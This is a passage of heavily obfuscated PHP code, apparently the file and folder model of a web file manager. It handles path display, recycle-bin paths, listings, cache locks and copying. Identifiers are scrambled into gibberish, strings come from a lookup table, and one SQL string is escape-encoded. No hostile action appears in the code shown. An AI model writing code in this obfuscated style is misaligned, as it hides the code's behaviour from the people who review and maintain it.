$¯¶–ˆÂ’[$ÌöñÕ®ğ[475]][$ÌöñÕ®ğ[525]] = $ë¼ÓËĞá[$ÌöñÕ®ğ[519]]; $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[526]] = $ë¼ÓËĞá; $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[527]] = $¯¶–ˆÂ’[$ÌöñÕ®ğ[528]]; $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[529]] = $ÌöñÕ®ğ[98]; if ($ë¼ÓËĞá[$ÌöñÕ®ğ[463]] != $ë¿×Ø‰¥) { $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[423]] = $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[423]] & $ë¼ÓËĞá[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[422]]; } continue; } $ÀåÁË§¬ = $this->parentLevelArray($¯¶–ˆÂ’[$ÌöñÕ®ğ[530]]); $ÈöÇ£öô = array_reverse($ÀåÁË§¬); foreach ($ÈöÇ£öô as $õÚçúæ– => $şÙçáµø) { if (!isset($µÛ´·Æ£[$şÙçáµø])) { continue; } $ë¼ÓËĞá = $µÛ´·Æ£[$şÙçáµø]; $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[526]] = $ë¼ÓËĞá; if ($ë¼ÓËĞá[$ÌöñÕ®ğ[463]] != $ë¿×Ø‰¥) { $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[423]] = $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[423]] & $ë¼ÓËĞá[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[422]]; } $”÷÷–·´ = $ÌöñÕ®ğ[22]; $˜ÃşÅ¬ = count($ÀåÁË§¬) - $õÚçúæ–; for ($ç×€Å¥ª = 0; $ç×€Å¥ª < $˜ÃşÅ¬; $ç×€Å¥ª++) { if (!isset($ñÕ’ª¦¾[$ÀåÁË§¬[$ç×€Å¥ª]])) { $”÷÷–·´ = $ÌöñÕ®ğ[22]; break; } $”÷÷–·´ = $”÷÷–·´ . rtrim($ñÕ’ª¦¾[$ÀåÁË§¬[$ç×€Å¥ª]], $ÌöñÕ®ğ[18]) . $ÌöñÕ®ğ[18]; } $¯¶–ˆÂ’[$ÌöñÕ®ğ[422]][$ÌöñÕ®ğ[527]] = rtrim($”÷÷–·´, $ÌöñÕ®ğ[18]) . $ÌöñÕ®ğ[18]; break; } } unset($¯¶–ˆÂ’); } public function groupPathDisplay(&$˜ä±‡õù) { $…Üı”’ =& $_SERVER[¹Û¹Æ€]; if ($˜ä±‡õù[$…Üı”’[420]] != self::TYPE_GROUP) { return; } $ºÔŸåò = Model($…Üı”’[531])->getInfo($˜ä±‡õù[$…Üı”’[514]]); $­Ãá¯·Í = $this->parentLevelArray($ºÔŸåò[$…Üı”’[530]]); $êãèã·ã = $…Üı”’[22]; foreach ($­Ãá¯·Í as $œƒÃ¿—) { $¢ËÒû” = Model($…Üı”’[531])->getInfo($œƒÃ¿—); $êãèã·ã .= $¢ËÒû”[$…Üı”’[96]][$…Üı”’[411]] . $…Üı”’[60]; } $˜ä±‡õù[$…Üı”’[532]] = $ºÔŸåò[$…Üı”’[441]]; $˜ä±‡õù[$…Üı”’[533]] = $ºÔŸåò[$…Üı”’[530]]; $˜ä±‡õù[$…Üı”’[534]] = $ºÔŸåò[$…Üı”’[535]]; $˜ä±‡õù[$…Üı”’[536]] = $êãèã·ã . $ºÔŸåò[$…Üı”’[96]][$…Üı”’[411]]; } protected function _listAppendPath(&$ıª•«ÈÖ, $Óë‰ÛØğ = false) { $¥æ¼š =& $_SERVER[¹Û¹Æ€]; static $É„íëÅ = array(); $åÑÎßºú = array(); $Ù‡ç¿¸– = array(); if ($Óë‰ÛØğ) { return $É„íëÅ; } foreach ($ıª•«ÈÖ as &$ªúÜÚ´Ï) { $¾Ü‰äã• = $ªúÜÚ´Ï[$¥æ¼š[411]]; if ($ªúÜÚ´Ï[$¥æ¼š[419]] == $¥æ¼š[98] && $ªúÜÚ´Ï[$¥æ¼š[441]] != 0) { $É„íëÅ[$¾Ü‰äã•] = $ªúÜÚ´Ï[$¥æ¼š[42]]; } if ($ªúÜÚ´Ï[$¥æ¼š[419]] == $¥æ¼š[98] && $ªúÜÚ´Ï[$¥æ¼š[441]] == 0 && !isset($É„íëÅ[$¾Ü‰äã•])) { $É„íëÅ[$¾Ü‰äã•] = $this->_listAppendPathRoot($ªúÜÚ´Ï, array()); } if (isset($Ù‡ç¿¸–[$ªúÜÚ´Ï[$¥æ¼š[530]]])) { continue; } $Ù‡ç¿¸–[$ªúÜÚ´Ï[$¥æ¼š[530]]] = !0; $ò¢«Ç£ì = $this->parentLevelArray($ªúÜÚ´Ï[$¥æ¼š[530]]); foreach ($ò¢«Ç£ì as $óÔï”ûÅ => $ãÒ±óó) { if (isset($É„íëÅ[$ãÒ±óó])) { continue; } if ($óÔï”ûÅ == 0) { $É„íëÅ[$ãÒ±óó] = $this->_listAppendPathRoot($ªúÜÚ´Ï, $ò¢«Ç£ì); } if ($óÔï”ûÅ != 0) { $åÑÎßºú[] = $ãÒ±óó; } } } unset($ªúÜÚ´Ï); $åÑÎßºú = array_unique($åÑÎßºú); if (count($åÑÎßºú) > 0) { $ò‚¶â˜’ = array($¥æ¼š[426] => array($¥æ¼š[427], $åÑÎßºú)); if (count($åÑÎßºú) == 1) { $íæöÙÖ› = $this->sourceInfo($åÑÎßºú[0]); $«éñÏŸÛ = is_array($íæöÙÖ›) ? array($íæöÙÖ›) : !1; } else { $«éñÏŸÛ = $this->field($¥æ¼š[537])->where($ò‚¶â˜’)->select(); } if (!$«éñÏŸÛ) { $«éñÏŸÛ = array(); } foreach ($«éñÏŸÛ as $Í„õùÑ) { $É„íëÅ[$Í„õùÑ[$¥æ¼š[411]]] = $Í„õùÑ[$¥æ¼š[42]]; } } $óï®Â›‰ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ïşªØ¯Ü = array(); foreach ($ıª•«ÈÖ as &$ªúÜÚ´Ï) { $šÒƒı× = $ªúÜÚ´Ï[$¥æ¼š[530]]; $…Ê”´åö = $¥æ¼š[22]; if (isset($ïşªØ¯Ü[$šÒƒı×])) { $…Ê”´åö = $ïşªØ¯Ü[$šÒƒı×]; } else { $ò¢«Ç£ì = $this->parentLevelArray($ªúÜÚ´Ï[$¥æ¼š[530]]); foreach ($ò¢«Ç£ì as $óÔï”ûÅ => $ãÒ±óó) { if (isset($É„íëÅ[$ãÒ±óó])) { $…Ê”´åö .= $É„íëÅ[$ãÒ±óó] . $¥æ¼š[18]; } } $ïşªØ¯Ü[$šÒƒı×] = $…Ê”´åö; } $…Ê”´åö .= $ªúÜÚ´Ï[$¥æ¼š[42]]; if ($ªúÜÚ´Ï[$¥æ¼š[419]] == $¥æ¼š[98]) { $…Ê”´åö .= $¥æ¼š[18]; } $ªúÜÚ´Ï[$¥æ¼š[528]] = str_replace($¥æ¼š[538], $¥æ¼š[18], $…Ê”´åö); if ($ªúÜÚ´Ï[$¥æ¼š[441]] == $¥æ¼š[207]) { $ªúÜÚ´Ï[$¥æ¼š[42]] = trim($É„íëÅ[$ªúÜÚ´Ï[$¥æ¼š[411]]], $¥æ¼š[18]); $ªúÜÚ´Ï[$¥æ¼š[528]] = $ªúÜÚ´Ï[$¥æ¼š[42]] . $¥æ¼š[18]; } if (intval($ªúÜÚ´Ï[$¥æ¼š[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ªúÜÚ´Ï, $ò¢«Ç£ì, $óï®Â›‰); } } unset($ªúÜÚ´Ï); return $ıª•«ÈÖ; } private function _listAppendPathRecycle(&$æ†ä´ñ…, $ÎòÑî£, $æÜÜçÒ¨) { $»º¤ò·£ =& $_SERVER[¹Û¹Æ€]; if (!in_array($æÜÜçÒ¨, $ÎòÑî£) && $æ†ä´ñ…[$»º¤ò·£[411]] != $æÜÜçÒ¨) { return; } $Ü€¼ê¾ = explode($»º¤ò·£[18], trim($æ†ä´ñ…[$»º¤ò·£[528]], $»º¤ò·£[18])); $É—‡Ï‰ = implode($»º¤ò·£[18], array_slice($Ü€¼ê¾, 2)); $æ†ä´ñ…[$»º¤ò·£[528]] = $»º¤ò·£[18] . LNG($»º¤ò·£[539]) . $»º¤ò·£[18] . ltrim($É—‡Ï‰, $»º¤ò·£[18]); $æ†ä´ñ…[$»º¤ò·£[530]] = $»º¤ò·£[540] . implode($»º¤ò·£[60], array_slice($ÎòÑî£, 1)) . $»º¤ò·£[60]; if ($æ†ä´ñ…[$»º¤ò·£[411]] == $æÜÜçÒ¨) { $æ†ä´ñ…[$»º¤ò·£[530]] = $»º¤ò·£[540]; $æ†ä´ñ…[$»º¤ò·£[441]] = $»º¤ò·£[207]; $æ†ä´ñ…[$»º¤ò·£[42]] = LNG($»º¤ò·£[539]); } $æ†ä´ñ…[$»º¤ò·£[541]] = $»º¤ò·£[542]; } protected function _listAppendPathRoot(&$„¹¨Â±·, $¼¼©ĞÛ²) { $šƒ—ê¡ =& $_SERVER[¹Û¹Æ€]; static $ÍŠ‡”Ï‡ = false; $œ©Õ®©õ = $šƒ—ê¡[22]; if ($„¹¨Â±·[$šƒ—ê¡[420]] == self::TYPE_USER) { if (defined($šƒ—ê¡[484]) && $„¹¨Â±·[$šƒ—ê¡[514]] == USER_ID) { $œ©Õ®©õ = LNG($šƒ—ê¡[543]); if ($ÍŠ‡”Ï‡ === !1) { $«İœÏªÒ = Model($šƒ—ê¡[544])->getInfoFull(USER_ID); $ÍŠ‡”Ï‡ = _get($«İœÏªÒ, $šƒ—ê¡[545], $šƒ—ê¡[22]); } if ($¼¼©ĞÛ² && $¼¼©ĞÛ²[0] == $ÍŠ‡”Ï‡ || !$¼¼©ĞÛ² && $„¹¨Â±·[$šƒ—ê¡[411]] == $ÍŠ‡”Ï‡) { $œ©Õ®©õ = LNG($šƒ—ê¡[546]); $„¹¨Â±·[$šƒ—ê¡[547]] = $šƒ—ê¡[548]; } if (!$¼¼©ĞÛ²) { $„¹¨Â±·[$šƒ—ê¡[42]] = $œ©Õ®©õ; } } else { $ñÊ£Öäá = Model($šƒ—ê¡[522])->getInfoSimple($„¹¨Â±·[$šƒ—ê¡[514]]); $œ©Õ®©õ = LNG($šƒ—ê¡[549]) . $šƒ—ê¡[172] . $ñÊ£Öäá[$šƒ—ê¡[42]] . $šƒ—ê¡[174]; $„¹¨Â±·[$šƒ—ê¡[550]] = array($šƒ—ê¡[42] => $ñÊ£Öäá[$šƒ—ê¡[42]], $šƒ—ê¡[551] => $ñÊ£Öäá[$šƒ—ê¡[551]], $šƒ—ê¡[552] => $ñÊ£Öäá[$šƒ—ê¡[552]]); } } else { if ($„¹¨Â±·[$šƒ—ê¡[420]] == self::TYPE_GROUP) { $ñÊ£Öäá = Model($šƒ—ê¡[531])->getInfoSimple($„¹¨Â±·[$šƒ—ê¡[514]]); $œ©Õ®©õ = $ñÊ£Öäá[$šƒ—ê¡[42]]; } else { if ($„¹¨Â±·[$šƒ—ê¡[420]] == self::TYPE_SYSTEM) { $œ©Õ®©õ = $šƒ—ê¡[553]; } } } $œ©Õ®©õ = $œ©Õ®©õ ? $šƒ—ê¡[18] . $œ©Õ®©õ . $šƒ—ê¡[18] : $šƒ—ê¡[18]; return $œ©Õ®©õ; } protected function _listAppendUser(&$µ©×©Ó) { $µ­æÈí² =& $_SERVER[¹Û¹Æ€]; $Œ’•ÍÀé = array_to_keyvalue($µ©×©Ó, $µ­æÈí²[22], $µ­æÈí²[463]); $´ìªµÑ = array_to_keyvalue($µ©×©Ó, $µ­æÈí²[22], $µ­æÈí²[465]); $©ŞóŠÚÊ = array_merge($Œ’•ÍÀé, $´ìªµÑ); $ªºöõİÛ = Model($µ­æÈí²[544])->userListInfo($©ŞóŠÚÊ); foreach ($µ©×©Ó as &$œııÙğİ) { $ø€³ßêÃ = $œııÙğİ[$µ­æÈí²[463]]; $œııÙğİ[$µ­æÈí²[463]] = $ªºöõİÛ[$ø€³ßêÃ] ? $ªºöõİÛ[$ø€³ßêÃ] : !1; $ø€³ßêÃ = $œııÙğİ[$µ­æÈí²[465]]; $œııÙğİ[$µ­æÈí²[465]] = $ªºöõİÛ[$ø€³ßêÃ] ? $ªºöõİÛ[$ø€³ßêÃ] : !1; if (isset($œııÙğİ[$µ­æÈí²[475]]) && $œııÙğİ[$µ­æÈí²[475]][$µ­æÈí²[554]]) { $£„¨Ù = $GLOBALS[$µ­æÈí²[16]][$µ­æÈí²[99]][$µ­æÈí²[555]]; if ($œııÙğİ[$µ­æÈí²[475]][$µ­æÈí²[556]] <= time() - $£„¨Ù) { $this->metaSet($œııÙğİ[$µ­æÈí²[411]], $µ­æÈí²[554], null); $this->metaSet($œııÙğİ[$µ­æÈí²[411]], $µ­æÈí²[556], null); unset($œııÙğİ[$µ­æÈí²[475]][$µ­æÈí²[554]]); continue; } $ØìÅÓ¤ = $œııÙğİ[$µ­æÈí²[475]][$µ­æÈí²[554]]; $œııÙğİ[$µ­æÈí²[475]][$µ­æÈí²[557]] = Model($µ­æÈí²[544])->getInfoSimpleOuter($ØìÅÓ¤); } } unset($œııÙğİ); } public function parentLevelArray($ı¾À‚ë›) { $”ê‹Œ¢¤ =& $_SERVER[¹Û¹Æ€]; $ı¾À‚ë› = explode($”ê‹Œ¢¤[60], trim($ı¾À‚ë›, $”ê‹Œ¢¤[60])); return array_remove_value($ı¾À‚ë›, $”ê‹Œ¢¤[207]); } public function listAll($ÙõıŒ) { $¥ğˆ«©Ø =& $_SERVER[¹Û¹Æ€]; $¼äìâş« = $this->sourceInfo($ÙõıŒ); $¡ñßöÓ… = array($¥ğˆ«©Ø[558] => array($¥ğˆ«©Ø[559], $¼äìâş«[$¥ğˆ«©Ø[530]] . $ÙõıŒ . $¥ğˆ«©Ø[560]), $¥ğˆ«©Ø[561] => 0); $âÌ¤µ€ = $¥ğˆ«©Ø[562]; $•ó˜Ñˆ˜ = "\x4c\105\x46\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\x5f\x66\x69\154\x65\40\x66\x69\x6c\x65\x20\157\x6e\x20\163\x6f\165\x72\x63\145\56\146\151\154\x65\111\x44\x20\75\40\146\151\154\145\x2e\x66\151\x6c\145\111\x44"; $Ïü»„½ = $this->alias($¥ğˆ«©Ø[455])->field($âÌ¤µ€)->where($¡ñßöÓ…)->join($•ó˜Ñˆ˜)->select(); $this->_listAppendAuth($Ïü»„½); $this->_listAppendUser($Ïü»„½); $this->_listAppendPath($Ïü»„½); $Ïü»„½ = array_to_keyvalue($Ïü»„½, $¥ğˆ«©Ø[411]); $ŸûŒã«Œ = "\57{$¼äìâş«[$¥ğˆ«©Ø[42]]}\57"; $ŸûŒã«Œ = $ŸûŒã«Œ == $¥ğˆ«©Ø[538] ? $¥ğˆ«©Ø[18] : $ŸûŒã«Œ; $ÍÉãÓ¢÷ = array(); foreach ($Ïü»„½ as $½˜ñ–’ => $±µ¥ş‘Ö) { $…Â®¥† = $this->parentLevelArray($±µ¥ş‘Ö[$¥ğˆ«©Ø[530]]); array_shift($…Â®¥†); $Æ’óÓÂè = $ŸûŒã«Œ; for ($Ä’ªñé = 0; $Ä’ªñé < count($…Â®¥†); $Ä’ªñé++) { $Æ’óÓÂè .= $Ïü»„½[$…Â®¥†[$Ä’ªñé]][$¥ğˆ«©Ø[42]] . $¥ğˆ«©Ø[18]; } $Æ’óÓÂè .= $±µ¥ş‘Ö[$¥ğˆ«©Ø[42]]; if ($±µ¥ş‘Ö[$¥ğˆ«©Ø[419]]) { $Æ’óÓÂè .= $¥ğˆ«©Ø[18]; } $Æ’óÓÂè = str_replace($¥ğˆ«©Ø[538], $¥ğˆ«©Ø[18], $Æ’óÓÂè); $Æ’óÓÂè = str_replace($¥ğˆ«©Ø[538], $¥ğˆ«©Ø[18], $Æ’óÓÂè); $¼óƒó = array($¥ğˆ«©Ø[430] => str_replace($¥ğˆ«©Ø[538], $¥ğˆ«©Ø[18], $Æ’óÓÂè), $¥ğˆ«©Ø[563] => intval($±µ¥ş‘Ö[$¥ğˆ«©Ø[419]]), $¥ğˆ«©Ø[96] => $this->pathInfoFilter($±µ¥ş‘Ö)); if (!$±µ¥ş‘Ö[$¥ğˆ«©Ø[419]]) { $¼óƒó[$¥ğˆ«©Ø[477]] = $±µ¥ş‘Ö[$¥ğˆ«©Ø[477]]; $¼óƒó[$¥ğˆ«©Ø[97]] = $±µ¥ş‘Ö[$¥ğˆ«©Ø[94]]; } $ÍÉãÓ¢÷[] = $¼óƒó; } return $ÍÉãÓ¢÷; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($£øÍ÷‹ß) { $­´³†“ =& $_SERVER[¹Û¹Æ€]; if (!$this->allowLock()) { return; } $this->_lockCheck($­´³†“[564], $£øÍ÷‹ß); $ÂÈÁØù = 1; $this->_lockEvent($£øÍ÷‹ß, array($­´³†“[565], $­´³†“[566]), $ÂÈÁØù); $this->_lockParent($£øÍ÷‹ß, array($­´³†“[566]), $ÂÈÁØù); $this->_lockEvent($£øÍ÷‹ß, array($­´³†“[567], $­´³†“[568]), $ÂÈÁØù); $this->_lockCheckEnd($­´³†“[564], $£øÍ÷‹ß); } public function lockCopyEnd($¢‹ºÂÆñ) { $ª…İ¼ =& $_SERVER[¹Û¹Æ€]; if (!$this->allowLock()) { return; } $£ŠéÄı˜ = 0; $this->_lockEvent($¢‹ºÂÆñ, array($ª…İ¼[565], $ª…İ¼[566]), $£ŠéÄı˜); $this->_lockParent($¢‹ºÂÆñ, array($ª…İ¼[566]), $£ŠéÄı˜); $this->_lockEvent($¢‹ºÂÆñ, array($ª…İ¼[567], $ª…İ¼[568]), $£ŠéÄı˜); } public function lockWriteStart($ÑñÛµ°°, $«óàÁÁ¥ = '') { $œƒˆêÀŸ =& $_SERVER[¹Û¹Æ€]; if (!$this->allowLock()) { return; } $this->_lockCheck($œƒˆêÀŸ[565], $ÑñÛµ°°); $»ÒÓßÍÚ = 1; $this->_lockKey($œƒˆêÀŸ[569] . $ÑñÛµ°° . $œƒˆêÀŸ[20] . $«óàÁÁ¥, $»ÒÓßÍÚ); $this->_lockEvent($ÑñÛµ°°, array($œƒˆêÀŸ[564], $œƒˆêÀŸ[566]), $»ÒÓßÍÚ); $this->_lockParent($ÑñÛµ°°, array($œƒˆêÀŸ[564], $œƒˆêÀŸ[566]), $»ÒÓßÍÚ); $this->_lockCheckEnd($œƒˆêÀŸ[565], $ÑñÛµ°°); } public function lockWriteEnd($ú­·´õ, $¹Öé»¯  = '') { $˜Ö¸‡ª¿ =& $_SERVER[¹Û¹Æ€]; if (!$this->allowLock()) { return; } $œ‹…ô«Å = 0; $this->_lockKey($˜Ö¸‡ª¿[569] . $ú­·´õ . $˜Ö¸‡ª¿[20] . $¹Öé»¯ , $œ‹…ô«Å); $this->_lockEvent($ú­·´õ, array($˜Ö¸‡ª¿[564], $˜Ö¸‡ª¿[566]), $œ‹…ô«Å); $this->_lockParent($ú­·´õ, array($˜Ö¸‡ª¿[564], $˜Ö¸‡ª¿[566]), $œ‹…ô«Å); } public function lockMoveStart($é´µ«Ø) { $ñæ¥ÙŸå =& $_SERVER[¹Û¹Æ€]; if (!$this->allowLock()) { return; } $this->_lockCheck($ñæ¥ÙŸå[566], $é´µ«Ø); $¥…¿­’ = 1; $this->_lockKey($ñæ¥ÙŸå[570] . $é´µ«Ø, $¥…¿­’); $this->_lockEvent($é´µ«Ø, array($ñæ¥ÙŸå[564], $ñæ¥ÙŸå[565]), $¥…¿­’); $this->_lockParent($é´µ«Ø, array($ñæ¥ÙŸå[564], $ñæ¥ÙŸå[566]), $¥…¿­’); $this->_lockEvent($é´µ«Ø, array($ñæ¥ÙŸå[571], $ñæ¥ÙŸå[567], $ñæ¥ÙŸå[568]), $¥…¿­’); $this->_lockCheckEnd($ñæ¥ÙŸå[566], $é´µ«Ø); } public function lockMoveEnd($×äƒğø) { $ŠÃÊÛç =& $_SERVER[¹Û¹Æ€]; if (!$this->allowLock()) { return; } $İ¨§í÷ = 0; $this->_lockKey($ŠÃÊÛç[570] . $×äƒğø, $İ¨§í÷); $this->_lockEvent($×äƒğø, array($ŠÃÊÛç[564], $ŠÃÊÛç[565]), $İ¨§í÷); $this->_lockParent($×äƒğø, array($ŠÃÊÛç[564], $ŠÃÊÛç[566]), $İ¨§í÷); $this->_lockEvent($×äƒğø, array($ŠÃÊÛç[571], $ŠÃÊÛç[567], $ŠÃÊÛç[568]), $İ¨§í÷); } private function _lockCheck($Õ³µêÀ¸, $áÒ¨ŸíÉ) { $îÜ®ˆ“¶ =& $_SERVER[¹Û¹Æ€]; $³€ò— = $this->sourceInfo($áÒ¨ŸíÉ); $“êŠÏÃ = $Õ³µêÀ¸ . $îÜ®ˆ“¶[20] . $áÒ¨ŸíÉ; $this->_lockTimeStart[$“êŠÏÃ] = timeFloat(); if (!is_array($³€ò—)) { return; } $¹½¢Û÷– = LNG($îÜ®ˆ“¶[572]); CacheLock::setErrorMsg($îÜ®ˆ“¶[172] . htmlspecialchars($³€ò—[$îÜ®ˆ“¶[42]]) . $îÜ®ˆ“¶[174] . $¹½¢Û÷–); $this->_lockKey($“êŠÏÃ, 1); $this->_lockKey($“êŠÏÃ, 0); $üÌ·İçë = array_reverse($this->parentLevelArray($³€ò—[$îÜ®ˆ“¶[530]])); foreach ($üÌ·İçë as $ñ’ƒĞÂâ) { $“êŠÏÃ = $Õ³µêÀ¸ . $îÜ®ˆ“¶[573] . $ñ’ƒĞÂâ; if (CacheLock::lockGet($îÜ®ˆ“¶[574] . $“êŠÏÃ)) { $³€ò— = $this->sourceInfo($ñ’ƒĞÂâ); CacheLock::setErrorMsg($îÜ®ˆ“¶[172] . htmlspecialchars($³€ò—[$îÜ®ˆ“¶[42]]) . $îÜ®ˆ“¶[174] . $¹½¢Û÷–); $this->_lockKey($“êŠÏÃ, 1); $this->_lockKey($“êŠÏÃ, 0); } } } private function _lockCheckEnd($¢ÆÈ¸ñÓ, $˜·šæì·) { $Ë¾ë ˜÷ =& $_SERVER[¹Û¹Æ€]; $±§ñÀ²Œ = $¢ÆÈ¸ñÓ . $Ë¾ë ˜÷[20] . $˜·šæì·; CacheLock::setErrorMsg($Ë¾ë ˜÷[387]); if (!isset($this->_lockTimeStart[$±§ñÀ²Œ])) { return; } $óîã”Ê¨ = timeFloat() - $this->_lockTimeStart[$±§ñÀ²Œ]; unset($this->_lockTimeStart[$±§ñÀ²Œ]); if ($óîã”Ê¨ > 0.5) { unset(self::$cacheSourceInfo[$Ë¾ë ˜÷[469] . $˜·šæì·]); } $ëêşğ« = $this->sourceInfo($˜·šæì·); if (!$ëêşğ«) { show_json(LNG($Ë¾ë ˜÷[115]), !1); } } private function _lockParent($±Üõ­, $¾œÑÆ×Æ, $õÊ˜ùô³) { if (!$this->autoLockSet) { return; } $ã¶Áı´¨ = $this->sourceInfo($±Üõ­); if (!is_array($ã¶Áı´¨)) { return; } $ì½Ì¿•² = array_reverse($this->parentLevelArray($ã¶Áı´¨[$_SERVER[¹Û¹Æ€][530]])); foreach ($ì½Ì¿•² as $€¤İÆæ) { $this->_lockEvent($€¤İÆæ, $¾œÑÆ×Æ, $õÊ˜ùô³); } } private function _lockEvent($Åˆüèù, $œ–©şÒ–, $ç’Ì–£¹) { $‰ÅÀŒöÏ =& $_SERVER[¹Û¹Æ€]; if (!$this->autoLockSet) { return; } foreach ($œ–©şÒ– as $ÆÈœğ½´) { $æÌë§â† = $ÆÈœğ½´ . $‰ÅÀŒöÏ[20] . $Åˆüèù; if ($ç’Ì–£¹ && CacheLock::lockGet($‰ÅÀŒöÏ[574] . $æÌë§â†)) { continue; } $this->_lockKey($æÌë§â†, $ç’Ì–£¹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¯£÷­ÂĞ, $©¾Â“Íâ = 1) { $›´®İíÌ = $_SERVER[¹Û¹Æ€][574] . md5($¯£÷­ÂĞ); if ($©¾Â“Íâ) { if (isset(self::$_lockItemArr[$›´®İíÌ])) { return; } self::$_lockItemArr[$›´®İíÌ] = 1; CacheLock::lock($›´®İíÌ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$›´®İíÌ])) { return; } unset(self::$_lockItemArr[$›´®İíÌ]); CacheLock::unlock($›´®İíÌ); } } public function isParentOf($…·Å§ô, $çú¾œ­) { $“†»Áäç =& $_SERVER[¹Û¹Æ€]; $¾ØÓù±¿ = $this->sourceInfo($…·Å§ô); $¬¾—˜õÂ = $this->sourceInfo($çú¾œ­); $”Æéó¦  = $¾ØÓù±¿[$“†»Áäç[530]] . $¾ØÓù±¿[$“†»Áäç[411]] . $“†»Áäç[60]; $Æ°Ñ½Ï = $¬¾—˜õÂ[$“†»Áäç[530]] . $¬¾—˜õÂ[$“†»Áäç[411]] . $“†»Áäç[60]; $›³ö§®’ = strpos($Æ°Ñ½Ï, $”Æéó¦ ) === 0; return $›³ö§®’; } private $targetIsDelete = 0; public function copy($»Ÿ¨ïÆõ, $©®õÁ¼ä, $ö¶ıå¬Ô = REPEAT_REPLACE, $ò±¿ã¯ò = '') { $¨¡ÎËÇ¾ =& $_SERVER[¹Û¹Æ€]; $›äè¼Ş¨ = $this->sourceInfo($»Ÿ¨ïÆõ); $Äı¹®Í = $this->sourceInfo($©®õÁ¼ä); if (!$›äè¼Ş¨ || !$Äı¹®Í || $Äı¹®Í[$¨¡ÎËÇ¾[419]] != $¨¡ÎËÇ¾[98]) { return !1; } if ($this->isParentOf($»Ÿ¨ïÆõ, $©®õÁ¼ä)) { return !1; } $ÅÛ»’å— = $ò±¿ã¯ò ? $ò±¿ã¯ò : $›äè¼Ş¨[$¨¡ÎËÇ¾[42]]; $this->lockCopyStart($»Ÿ¨ïÆõ); $this->lockWriteStart($©®õÁ¼ä, $ÅÛ»’å—); $ıá¶¨Ñ = array($¨¡ÎËÇ¾[575] => array(), $¨¡ÎËÇ¾[576] => array(), $¨¡ÎËÇ¾[577] => array()); $this->targetIsDelete = intval($›äè¼Ş¨[$¨¡ÎËÇ¾[440]]); $§°ı¾»µ = $this->fileNameExistCache($©®õÁ¼ä, $›äè¼Ş¨[$¨¡ÎËÇ¾[42]]); $½´÷áÍ = $this->_copy($»Ÿ¨ïÆõ, $©®õÁ¼ä, $ö¶ıå¬Ô, $ıá¶¨Ñ, !0, $ò±¿ã¯ò); $this->_childrenListClear(); $this->lockCopyEnd($»Ÿ¨ïÆõ); $this->lockWriteEnd($©®õÁ¼ä, $ÅÛ»’å—); if ($›äè¼Ş¨[$¨¡ÎËÇ¾[419]] == $¨¡ÎËÇ¾[98] && $§°ı¾»µ == $½´÷áÍ) { $this->folderSizeResetChildren($§°ı¾»µ); } Model($¨¡ÎËÇ¾[578])->addAll($ıá¶¨Ñ[$¨¡ÎËÇ¾[576]], array(), !0); if ($§°ı¾»µ != $½´÷áÍ || $›äè¼Ş¨[$¨¡ÎËÇ¾[419]] == $¨¡ÎËÇ¾[98]) { Model($¨¡ÎËÇ¾[579])->eventCopy($½´÷áÍ); } $this->saveAll($ıá¶¨Ñ[$¨¡ÎËÇ¾[577]]); Model($¨¡ÎËÇ¾[209])->linkAdd($ıá¶¨Ñ[$¨¡ÎËÇ¾[575]]); $this->folderSizeReset($©®õÁ¼ä); $this->updateModifyTime($©®õÁ¼ä); return $½´÷áÍ; } private function _copy($”ƒ¢µ¥‘, $Ï‰áËµ„, $è«ø÷…, &$îÉˆ¶Ù, $ÒûÖ, $îÅ°´ù = '') { $ÛÍ¶°•İ =& $_SERVER[¹Û¹Æ€]; $¨ïšÅûò = $this->sourceInfoCache($”ƒ¢µ¥‘); $Á‚Šº‰‚ = $¨ïšÅûò[$ÛÍ¶°•İ[419]] == $ÛÍ¶°•İ[98]; $Šö…ÓÓ = $îÅ°´ù ? $îÅ°´ù : $¨ïšÅûò[$ÛÍ¶°•İ[42]]; $º“˜™›ø = $this->fileNameExistCache($Ï‰áËµ„, $Šö…ÓÓ); if ($ÒûÖ) { $this->_childrenAllMake($”ƒ¢µ¥‘); if ($Á‚Šº‰‚ && $º“˜™›ø) { $this->_childrenAllMake($º“˜™›ø); } } if (!$º“˜™›ø) { return $this->_copyCreate($”ƒ¢µ¥‘, $Ï‰áËµ„, $Šö…ÓÓ, $îÉˆ¶Ù); } $¼×ÇÅ–² = $º“˜™›ø; if ($Á‚Šº‰‚) { if ($è«ø÷… == REPEAT_RENAME_FOLDER) { $Šö…ÓÓ = $this->fileNameAutoCache($Ï‰áËµ„, $Šö…ÓÓ, $è«ø÷…, $Á‚Šº‰‚); $¼×ÇÅ–² = $this->_copyCreate($”ƒ¢µ¥‘, $Ï‰áËµ„, $Šö…ÓÓ, $îÉˆ¶Ù); } else { $¸¥—¦¡… = $this->_childrenList($”ƒ¢µ¥‘); foreach ($¸¥—¦¡… as $·ú‡——) { $this->_copy($·ú‡——[$ÛÍ¶°•İ[411]], $º“˜™›ø, $è«ø÷…, $îÉˆ¶Ù, !1); } } } else { if ($è«ø÷… == REPEAT_RENAME || $è«ø÷… == REPEAT_RENAME_FOLDER) { $Šö…ÓÓ = $this->fileNameAutoCache($Ï‰áËµ„, $Šö…ÓÓ, $è«ø÷…, $Á‚Šº‰‚); $¼×ÇÅ–² = $this->_copyCreate($”ƒ¢µ¥‘, $Ï‰áËµ„, $Šö…ÓÓ, $îÉˆ¶Ù); } else { if 